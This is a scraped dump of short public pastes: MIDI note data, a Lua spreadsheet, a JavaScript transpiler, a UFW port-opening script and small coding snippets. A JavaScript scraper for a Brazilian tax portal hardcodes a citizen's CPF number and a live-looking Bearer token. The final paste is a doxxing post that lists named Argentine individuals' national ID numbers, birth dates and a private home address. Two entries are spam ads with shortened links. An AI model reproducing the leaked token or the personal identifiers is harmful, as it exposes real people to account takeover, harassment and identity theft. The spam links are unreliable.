          ""midi"": 88,
          ""time"": 38.46766500000004,
          ""velocity"": 0.1968503937007874,
          ""duration"": 2.1774149999999963
        }
      ],
      ""controlChanges"": {},
      ""id"": 0,
      ""name"": ""Grand Piano (Classic)"",
      ""instrumentNumber"": 0,
      ""instrument"": ""acoustic grand piano"",
      ""instrumentFamily"": ""piano"",
      ""channelNumber"": 0,
      ""isPercussion"": false
    },
    {
      ""startTime"": 7.74192,
      ""duration"": 36.77411999999998,
      ""length"": 46,
      ""notes"": [
        {
          ""name"": ""B2"",
          ""midi"": 47,
          ""time"": 7.74192,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.93548
        },
        {
          ""name"": ""E3"",
          ""midi"": 52,
          ""time"": 7.74192,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.93548
        },
        {
          ""name"": ""B3"",
          ""midi"": 59,
          ""time"": 7.74192,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.93548
        },
        {
          ""name"": ""A3"",
          ""midi"": 57,
          ""time"": 9.6774,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.93548
        },
        {
          ""name"": ""D3"",
          ""midi"": 50,
          ""time"": 9.6774,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.93548
        },
        {
          ""name"": ""A2"",
          ""midi"": 45,
          ""time"": 9.6774,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.93548
        },
        {
          ""name"": ""E3"",
          ""midi"": 52,
          ""time"": 11.61288,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.93548
        },
        {
          ""name"": ""B2"",
          ""midi"": 47,
          ""time"": 11.61288,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.93548
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 11.61288,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.93548
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 15.48384,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 15.48384,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""B3"",
          ""midi"": 59,
          ""time"": 15.48384,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E3"",
          ""midi"": 52,
          ""time"": 15.48384,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""B2"",
          ""midi"": 47,
          ""time"": 15.48384,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""A3"",
          ""midi"": 57,
          ""time"": 17.41932,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""D3"",
          ""midi"": 50,
          ""time"": 17.41932,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""A2"",
          ""midi"": 45,
          ""time"": 17.41932,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 17.41932,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 17.41932,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E3"",
          ""midi"": 52,
          ""time"": 19.354799999999997,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""B2"",
          ""midi"": 47,
          ""time"": 19.354799999999997,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 19.354799999999997,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""B3"",
          ""midi"": 59,
          ""time"": 19.354799999999997,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 19.354799999999997,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""B2"",
          ""midi"": 47,
          ""time"": 23.225759999999994,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E3"",
          ""midi"": 52,
          ""time"": 23.225759999999994,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""B3"",
          ""midi"": 59,
          ""time"": 23.225759999999994,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""A3"",
          ""midi"": 57,
          ""time"": 25.161239999999992,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""D3"",
          ""midi"": 50,
          ""time"": 25.161239999999992,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""A2"",
          ""midi"": 45,
          ""time"": 25.161239999999992,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E3"",
          ""midi"": 52,
          ""time"": 27.09671999999999,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""B2"",
          ""midi"": 47,
          ""time"": 27.09671999999999,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 27.09671999999999,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""F#3"",
          ""midi"": 54,
          ""time"": 30.483809999999988,
          ""velocity"": 0.3937007874015748,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 30.967679999999987,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 30.967679999999987,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""B3"",
          ""midi"": 59,
          ""time"": 30.967679999999987,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E3"",
          ""midi"": 52,
          ""time"": 30.967679999999987,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""A3"",
          ""midi"": 57,
          ""time"": 32.903159999999986,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""D3"",
          ""midi"": 50,
          ""time"": 32.903159999999986,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 32.903159999999986,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 32.903159999999986,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E3"",
          ""midi"": 52,
          ""time"": 34.838639999999984,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""B2"",
          ""midi"": 47,
          ""time"": 34.838639999999984,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""B3"",
          ""midi"": 59,
          ""time"": 34.838639999999984,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 34.838639999999984,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        }
      ],
      ""controlChanges"": {},
      ""id"": 1,
      ""name"": ""Electric Piano"",
      ""instrumentNumber"": 0,
      ""instrument"": ""acoustic grand piano"",
      ""instrumentFamily"": ""piano"",
      ""channelNumber"": 1,
      ""isPercussion"": false
    },
    {
      ""startTime"": 30.96768,
      ""duration"": 36.774119999999996,
      ""length"": 3,
      ""notes"": [
        {
          ""name"": ""B2"",
          ""midi"": 47,
          ""time"": 30.96768,
          ""velocity"": 0.3858267716535433,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""A2"",
          ""midi"": 45,
          ""time"": 32.90316,
          ""velocity"": 0.3858267716535433,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 34.83864,
          ""velocity"": 0.3858267716535433,
          ""duration"": 1.9354799999999983
        }
      ],
      ""controlChanges"": {},
      ""id"": 2,
      ""name"": ""Grand Piano"",
      ""instrumentNumber"": 0,
      ""instrument"": ""acoustic grand piano"",
      ""instrumentFamily"": ""piano"",
      ""channelNumber"": 2,
      ""isPercussion"": false
    },
    {
      ""startTime"": 7.74192,
      ""duration"": 36.774120000000046,
      ""length"": 56,
      ""notes"": [
        {
          ""name"": ""B1"",
          ""midi"": 35,
          ""time"": 7.74192,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""B1"",
          ""midi"": 35,
          ""time"": 8.22579,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""B1"",
          ""midi"": 35,
          ""time"": 8.70966,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""B1"",
          ""midi"": 35,
          ""time"": 9.193529999999999,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""D2"",
          ""midi"": 38,
          ""time"": 9.677399999999999,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""D2"",
          ""midi"": 38,
          ""time"": 10.161269999999998,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""D2"",
          ""midi"": 38,
          ""time"": 10.645139999999998,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""D2"",
          ""midi"": 38,
          ""time"": 11.129009999999997,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 11.612879999999997,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 12.096749999999997,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 12.580619999999996,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 13.064489999999996,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""G2"",
          ""midi"": 43,
          ""time"": 13.548359999999995,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.9677399999999992
        },
        {
          ""name"": ""A2"",
          ""midi"": 45,
          ""time"": 14.516099999999994,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.9677399999999992
        },
        {
          ""name"": ""B1"",
          ""midi"": 35,
          ""time"": 15.483839999999994,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B1"",
          ""midi"": 35,
          ""time"": 15.725774999999993,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B1"",
          ""midi"": 35,
          ""time"": 15.967709999999993,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B1"",
          ""midi"": 35,
          ""time"": 16.209644999999995,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B1"",
          ""midi"": 35,
          ""time"": 16.451579999999996,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B1"",
          ""midi"": 35,
          ""time"": 16.693514999999998,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B1"",
          ""midi"": 35,
          ""time"": 16.93545,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B1"",
          ""midi"": 35,
          ""time"": 17.177385,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D2"",
          ""midi"": 38,
          ""time"": 17.419320000000003,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D2"",
          ""midi"": 38,
          ""time"": 17.661255000000004,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D2"",
          ""midi"": 38,
          ""time"": 17.903190000000006,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D2"",
          ""midi"": 38,
          ""time"": 18.145125000000007,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D2"",
          ""midi"": 38,
          ""time"": 18.38706000000001,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D2"",
          ""midi"": 38,
          ""time"": 18.62899500000001,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D2"",
          ""midi"": 38,
          ""time"": 18.870930000000012,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D2"",
          ""midi"": 38,
          ""time"": 19.112865000000014,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 19.354800000000015,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 19.596735000000017,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 19.83867000000002,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 20.08060500000002,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 20.32254000000002,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 20.564475000000023,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 20.806410000000024,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 21.048345000000026,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B2"",
          ""midi"": 47,
          ""time"": 21.290280000000028,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A3"",
          ""midi"": 57,
          ""time"": 21.53221500000003,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E3"",
          ""midi"": 52,
          ""time"": 21.77415000000003,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A3"",
          ""midi"": 57,
          ""time"": 22.258020000000034,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D3"",
          ""midi"": 50,
          ""time"": 22.499955000000035,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A2"",
          ""midi"": 45,
          ""time"": 22.741890000000037,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B3"",
          ""midi"": 59,
          ""time"": 23.22576000000004,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D3"",
          ""midi"": 50,
          ""time"": 23.46769500000004,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E3"",
          ""midi"": 52,
          ""time"": 23.709630000000043,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B3"",
          ""midi"": 59,
          ""time"": 25.161240000000046,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E3"",
          ""midi"": 52,
          ""time"": 25.403175000000047,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A2"",
          ""midi"": 45,
          ""time"": 25.64511000000005,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 27.09672000000005,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.9677399999999992
        },
        {
          ""name"": ""A2"",
          ""midi"": 45,
          ""time"": 28.06446000000005,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.9677399999999992
        },
        {
          ""name"": ""B3"",
          ""midi"": 59,
          ""time"": 29.03220000000005,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""A3"",
          ""midi"": 57,
          ""time"": 29.51607000000005,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""E3"",
          ""midi"": 52,
          ""time"": 29.99994000000005,
          ""velocity"": 0.4251968503937008,
          ""duration"": 0.4838699999999996
        },
        {
          ""name"": ""E1"",
          ""midi"": 28,
          ""time"": 34.83864000000005,
          ""velocity"": 0.4251968503937008,
          ""duration"": 1.9354799999999983
        }
      ],
      ""controlChanges"": {},
      ""id"": 3,
      ""name"": ""Bass Guitar (Classic)"",
      ""instrumentNumber"": 32,
      ""instrument"": ""acoustic bass"",
      ""instrumentFamily"": ""bass"",
      ""channelNumber"": 3,
      ""isPercussion"": false
    },
    {
      ""startTime"": 30.96768,
      ""duration"": 38.709599999999995,
      ""length"": 3,
      ""notes"": [
        {
          ""name"": ""B2"",
          ""midi"": 47,
          ""time"": 30.96768,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""A2"",
          ""midi"": 45,
          ""time"": 32.90316,
          ""velocity"": 0.3937007874015748,
          ""duration"": 1.9354799999999983
        },
        {
          ""name"": ""E2"",
          ""midi"": 40,
          ""time"": 34.83864,
          ""velocity"": 0.3937007874015748,
          ""duration"": 3.8709599999999966
        }
      ],
      ""controlChanges"": {},
      ""id"": 4,
      ""name"": ""Bass"",
      ""instrumentNumber"": 32,
      ""instrument"": ""acoustic bass"",
      ""instrumentFamily"": ""bass"",
      ""channelNumber"": 4,
      ""isPercussion"": false
    }
  ]
}"
ZyNi9shw,calcis,aregrubb,Lua,Sunday 17th of December 2023 01:55:50 PM CDT,"
-- Simple Spreadsheet Program for ComputerCraft

local spreadsheet = {}
local rows, cols = 10, 10  -- Define the size of the spreadsheet

-- Initialize the spreadsheet with empty values
for r = 1, rows do
    spreadsheet[r] = {}
    for c = 1, cols do
        spreadsheet[r][c] = """"
    end
end

-- Function to display the spreadsheet
local function displaySpreadsheet()
    for r = 1, rows do
        for c = 1, cols do
            write(string.format(""%-12s"", spreadsheet[r][c]))
        end
        print()
    end
end

-- Function to enter data into the spreadsheet
local function enterData()
    print(""Enter row, column and value (e.g., 2 3 45.6). Type 'done' to finish."")
    while true do
        local input = read()
        if input == ""done"" then break end
        local r, c, value = input:match(""(%d+) (%d+) (%S+)"")
        r, c = tonumber(r), tonumber(c)
        if r and c and r <= rows and c <= cols then
            spreadsheet[r][c] = value
        else
            print(""Invalid input. Please enter row, column and value."")
        end
    end
end

-- Main program
print(""Simple Spreadsheet Program"")
enterData()
displaySpreadsheet()
"
32FNGtHs,BDScript Transpiler Prototype,Airen_BDFD,JavaScript,Sunday 17th of December 2023 01:52:49 PM CDT,"const readFileSync = require('fs').readFileSync;
const minify = require('uglify-js').minify;
const beautify = require('js-beautify').js;


const code = `
$let[message;¡Hola mundo!]
$log[$get[message]]
let _yuki_var_res = 
    $sum[12;1]
$log[$get[res]]
`.trim()


const Functions = [{
  name: '$get',
  description: 'Get a variable.',
  args: [{
    name: 'name',
    type: 'string',
    description: 'The name of the variable.'
  }],
  run: '_yuki_var_name'
},{
  name: '$let',
  description: 'Sets a variable',
  args: [{
    name: 'name',
    type: 'string',
    required: true
  },{
    name: 'value',
    type: 'string',
    required: true,
    kind: 'setter'
  }],
  run: 'let _yuki_var_name = value'
},{
  name: '$log',
  description: 'Logs a message to the console.',
  args: [{
    name: 'message',
    type: 'string',
    required: true
  }],
  run: 'console.log(message)'
},{
  name: '$sum',
  description: 'Adds two numbers together.',
  args: [{
    name: 'number1',
    type: 'number',
    required: true
  },{
    name: 'number2',
    type: 'number',
    required: true
  }],
  run: 'sum(number1, number2)'
}]

function ParseField(kind, type, input) {
  if (type === 'string') {
    let w = '';
    for (let c of input) {
      if (c === ""'"") {
        w += '\'';
      } else w += c;
    }
    return kind === 'setter' ? ""'"" + w + ""'"" : w;
  } else return input
}

function unpack(input) {
  return {
    name: input.match(/\$\w+/)?.[0],
    inside: input.match(/\[.*?\]/)?.[0] ?? null,
    splits: input.slice(input.indexOf('[') + 1, input.lastIndexOf(']')).split(';')
  }
}

function getTranspilation(args, spec) {
const newArgs = args.map((arg, i) => {
    return ParseField(spec.args[i]?.kind ?? 'getter', spec.args[i]?.type ?? 'string', arg)
  })
  let gen = spec.run
  let i = 0
  for (const arg of newArgs) {
    gen = gen.replace(spec.args[i]?.name, arg)
    i++
  }
  return gen
}

function Transpiler(
  code,
  functions,
  minified = false
) {
  code = code.split('\n').map(line => line.trim())
  let mainCode = 'const sum = (a, b) => a + b;\n' + 'async function _yuki_main_() {\n'
  
  for (const line of code) {
    let unpacked = unpack(line)
    const spec = functions.find(f => f.name === unpacked.name)
    if (!spec) {
      mainCode += line + '\n'
      continue
    }
    
    for (let i = 0; i < unpacked.splits.length; i++) {
      let split = unpacked.splits[i];
      if (split.startsWith('$')) {
        const u = unpack(split)
        const s = functions.find(f => f.name === u.name)
        if (!s) continue;
        unpacked.splits[i] = getTranspilation(u.splits, s)
      }
    }

    let transpiled = getTranspilation(unpacked.splits ?? [], spec)
    mainCode += transpiled + '\n'
  }
  
  mainCode += '\n}';
  return minified ? minify(mainCode).code : beautify(mainCode);
}

const tr = Transpiler(code, Functions, false)

eval([
  tr,
  '_yuki_main_()'
].join('\n'))"
D4k8Bc17,Untitled,sissou123,Python,Sunday 17th of December 2023 01:42:25 PM CDT,"PyTorch: Deep Learning and Artificial Intelligence
Neural Networks for Computer Vision, Time Series Forecasting, NLP, GANs, Reinforcement Learning, and More!
for more:https://dz-linkk.com/zqh84v"
r7GezFRt,Untitled,sissou123,Python,Sunday 17th of December 2023 01:28:36 PM CDT,"A deep understanding of deep learning (with Python intro)
Master deep learning in PyTorch using an experimental scientific approach, with lots of examples and practice problems.
for more:https://dz-linkk.com/7ZyAQK"
GS2wgv96,down or up,Yobanzda,Lua,Sunday 17th of December 2023 01:23:30 PM CDT,IsUp: 1
grFxpbhe,Untitled,hielasangre,Bash,Sunday 17th of December 2023 01:10:27 PM CDT,"#!/bin/bash

# Verificar si UFW está instalado
if ! command -v ufw &> /dev/null; then
    echo ""Instalando UFW...""
    sudo apt-get update
    sudo apt-get install -y ufw
fi

# Habilitar UFW
sudo ufw enable

# Abrir puertos
echo ""Abriendo puertos 8091, 53, 1080, 8080 y 443...""
sudo ufw allow 8091
sudo ufw allow 53
sudo ufw allow 1080
sudo ufw allow 8080
sudo ufw allow 443

# Mostrar el estado de UFW
sudo ufw status"
Lbk0rxzJ,Extrator de notas - NPB,51L3N7,JavaScript,Sunday 17th of December 2023 12:55:49 PM CDT,"/**
 * Extrai notas fisicais no site https://www.npb.sefaz.ba.gov.br/sistemas/nbpp/
 * @author Roger Pestana (rogerlima@outlook.com)
 * @date 17/dez/2023 
*/
( function() {
'use strict';

class NPB_extractnotes {
	constructor() {
		this.notes_list = [];
		this.requests_count = 0;
	}

	async request( init_date, end_date, page, page_size, authorization ) {
		return await fetch(
			`https://www.npb.sefaz.ba.gov.br/webservices/nbpa/portal/NotasFiscais/listagemNotas/?cpf=07129079550&tipoPesquisa=1
			&dataInicial=${ init_date }
			&dataFinal=${ end_date }&municipioId=
			&Page=${ page }
			&PageSize=${ page_size }`, {
				'credentials': 'include',
				'headers': {
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
					'Accept': 'application/json',
					'Accept-Language': 'en-US,pt-BR;q=0.8,pt;q=0.5,en;q=0.3',
					'NPB': 'True',
					'Authorization': authorization,
					'TokenBase': 'gSJkJabZxUApwLqA9oYiVUaJTmRDF86XPxqSz+12UoUgdK49r580SDxlhuE6aRPR',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin'
				},
				'referrer': 'https://www.npb.sefaz.ba.gov.br/sistemas/nbpp/consumidor/notas',
				'method': 'GET',
				'mode': 'cors'
			}
		);
	}

	async run( init_date, end_date, page, page_size, authorization ) {
		await this.request( ...arguments ).then( response => response.json().then( response => {
			if ( response.list.length === 0 ) {
				//console.log( this.notes_list );
				return;
			}
			
			this.notes_list = this.notes_list.concat( response.list );
			this.run( arguments[ 0 ], arguments[ 1 ], arguments[ 2 ] + this.requests_count++, arguments[ 3 ], arguments[ 4 ] );
		} ) );
	}
}

function npb_sumnotes( notes_list ) {
	let sum = 0;

	notes_list.forEach( el => {
		sum += el.val_total;
	} );

	return sum;
}

function npb_printnotes( notes_list ) {
	document.body.innerHTML = '';

	notes_list.forEach( el => {
		document.body.innerHTML += [ el.nom_razao_social, el.dtc_emissao, el.val_total ].join( ';' ) + '<br />'
	} );
}

window.NPB_extractnotes = NPB_extractnotes;
window.npb_sumnotes = npb_sumnotes;
window.npb_printnotes = npb_printnotes;

}( window ) );

// Exemplo
let npb = new NPB_extractnotes();

// Data inicial, data final, página inicial, resultados por página (máximo de 100), autorização
npb.run( '2018-01-01', '2023-12-17', 1, 100, 'Bearer C3w743KJ4jgvG-R5UDBdG5VqYlOr8nFIZ6KAFtNNOrwrqKhcZdugHfoPB-b6hw4ua0gAyQ90hMq61dfeLNQcuGDAsk39wzJp8tCtshpbaNuezybbso0X8jQKOHKb1Te2-UmyaRVsruT6vxgJ4ByRJ7h_KpLRCYrktZQ_cqQkdGTu62AaBN-w_YqfAgqWTtvTB49wozIgQwg4Vw5erB1qGpODM3RI4cr1Ixnml8YjFK-EZyUZP4Z5JMTP5Ay-jpdKOAFAtG0AExk6-20LegQwrMsdMdp4P33lIxjs5Be5PUGMH2U3cQTNAURR13pAYTNDheeIvl3wMh6cuBrNfiKotF7c6oz6MicFrjXJD-MZP9AWGmj9VOOZcvaCjej8VqYRHkAxhsGCxdoSiKyBPEgq0jgHXiF7kiewYiRBbMNx3A4' );"
QqN6hUg5,Listo (Contact Form 7): Sort lists alphabetically,YordanSoares,PHP,Sunday 17th of December 2023 12:50:39 PM CDT,"<?php
/**
 * Listo (Contact Form 7):
 * Sort lists alphabetically
 */
function wpcf7_listo_lists_sort( $data, $options, $args ) {
	if ( is_array( $data ) ) {
		asort( $data );	
	}
	return $data;
}
add_filter( 'wpcf7_form_tag_data_option', 'wpcf7_listo_lists_sort', 11, 3 );"
AF9Hezwj,24,nq1s788,Python,Sunday 17th of December 2023 12:42:12 PM CDT,"f = open('zadanie24_1.txt').readline()
answ = 0 #самая длина длина которую мы нашли
cur = 0 #текущая длина
for i in range(len(f)):
    if f[i] == 'C':
        cur += 1
        if cur > answ:
            answ = cur
    else:
        cur = 0
print(answ)"
FAW9Ywc3,Nuthost - Nutmailer - Leandro Antonio Capurro - Spam - Estafa [12/2023],bombaires,HTML,Sunday 17th of December 2023 12:32:33 PM CDT,"Con foto de Leandro Capurro

http://cutt.us/sl6nW (mas info y formulario, pega este enlace en tu navegador)

Nuthost srl - Nutmailer

   nuthost.com - nuthost.com.ar - nuthost.info - nuthost.net - nutmailer.com.ar - servidoraweb.net - transmitterhost.com.ar - emailmkt.xyz - beneficiosnuthost.com - ipdenavegacion.com.ar
   Real names - Los nombre reales: Leandro Rubén Capurro - Esteban Eduardo Ferriol - David Martin Guevara Quispe - Carlos Jaime Castelnuovo - Valentina Lipszyc - Diego Medrano - Pablo Solis - Francisco Rieiro
   CUIT 30710182171
   CUIT (Leandro Rubén Capurro): 20-26200067-3
   DNI (Leandro Rubén Capurro): 26.200.067
   Date of birth - Fecha de nacimiento (Leandro Rubén Capurro): 9/1/1977
   CUIT (Esteban Eduardo Ferriol): 20-26348747-9
   DNI (Esteban Eduardo Ferriol): 26.348.747
   Date of birth - Fecha de nacimiento (Esteban Eduardo Ferriol): 11/26/1977
   CUIT (Carlos Jaime Castelnuovo): 23-05374522-9
   DNI (Carlos Jaime Castelnuovo): 05.374.522
   Date of birth - Fecha de nacimiento (Carlos Jaime Castelnuovo): 8/13/1939
   Physical address - Dirección real: Callao Av. 420 Piso 9 - C1022 Buenos Aires
   José Antonio Cabrera 4026 - Palermo
   Alberti 559, Piso 3 Q - B8118ABK Cabildo (Leandro Rubén Capurro private)
